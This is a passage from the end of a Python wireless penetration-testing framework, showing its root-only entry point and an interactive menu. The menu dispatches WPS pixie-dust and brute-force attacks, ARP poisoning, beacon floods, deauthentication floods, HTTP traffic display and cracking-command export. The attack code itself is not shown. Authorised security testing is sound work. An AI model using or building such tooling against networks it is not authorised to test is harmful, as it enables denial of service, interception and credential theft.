                ap   = wps_aps[idx]
                mode = input("[p]ixie-dust / [b]rute-force: ").strip().lower()
                wa   = WPSAttack(iface, ap["bssid"], ap["channel"], ap.get("essid", ""))
                if mode == "p":
                    wa.pixie_dust()
                else:
                    wa.brute_force()
            except (ValueError, IndexError):
                error("Invalid selection.")

        elif choice == "6":
            sub = input("[a]rp-poison / [c]lient-isolation / [e]gress: ").strip()
            pe  = PostExploit()
            if sub == "a":
                pe.arp_poison(iface,
                              input("Gateway IP: ").strip(),
                              input("Target IP:  ").strip())
            elif sub == "c":
                pe.check_client_isolation(iface)
            elif sub == "e":
                pe.egress_filter_check(input("Gateway IP: ").strip())

        elif choice == "7":
            sub = input("[b]eacon-flood / [d]eauth-flood: ").strip().lower()
            if sub == "b":
                cnt = int(input("Beacon count [500]: ").strip() or "500")
                dos.beacon_flood(iface, cnt)
            elif sub == "d":
                bssid = input("Target BSSID: ").strip()
                try:
                    channel = int(input("Target AP Channel: ").strip())
                except ValueError:
                    error("Channel must be a number."); continue
                client = input("Client MAC (blank=broadcast): ").strip() or None
                try:
                    cnt = int(input("Count (0=Continuous) [0]: ").strip() or "0")
                except ValueError:
                    cnt = 0
                dos.deauth_flood(iface, bssid, channel, client, cnt)

        elif choice == "8":
            sub = input("[j]son / [c]sv / [k]rack-commands: ").strip()
            if sub == "j":
                reporter.to_json()
            elif sub == "c":
                reporter.to_csv()
            elif sub == "k":
                reporter.cracking_commands()

        elif choice == "h":
            reporter.show_http_traffic()
        
        elif choice == "p":
            t = int(input("Scan duration (seconds) [30]: ").strip() or "30")
            PNLExtractor(iface, t).run()


# =============================================================================
#  E N T R Y   P O I N T
# =============================================================================
def main():
    parser = argparse.ArgumentParser(description="WPF - Wireless Pentest Framework v1.7.0")
    parser.add_argument("-i", "--iface", help="Force use this wireless interface")
    args = parser.parse_args()

    banner()

    if os.geteuid() != 0:
        error("Must run as root: sudo python3 wpf.py")
        sys.exit(1)

    check_and_install_dependencies()
    check_deps()
    db_init()
    success("Database initialised → wpf_results.db")

    if args.iface:
        ifaces = [args.iface]
        InterfaceManager.set_monitor(args.iface)
    else:
        ifaces = InterfaceManager.detect_monitor_capable()
        if not ifaces:
            sys.exit(1)
        iface  = ifaces[0]
        choice = input(
            f"{C.CYAN}[?]{C.RESET} Set {C.YELLOW}{iface}{C.RESET} to monitor mode? [Y/n]: "
        ).strip()
        if choice.lower() != "n":
            InterfaceManager.set_monitor(iface)

    def _sig(sig, frame):
        print()
        warn("Interrupted - restoring interfaces...")
        for i in ifaces:
            InterfaceManager.set_managed(i)
        sys.exit(0)

    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    interactive_menu(ifaces)


if __name__ == "__main__":
    main()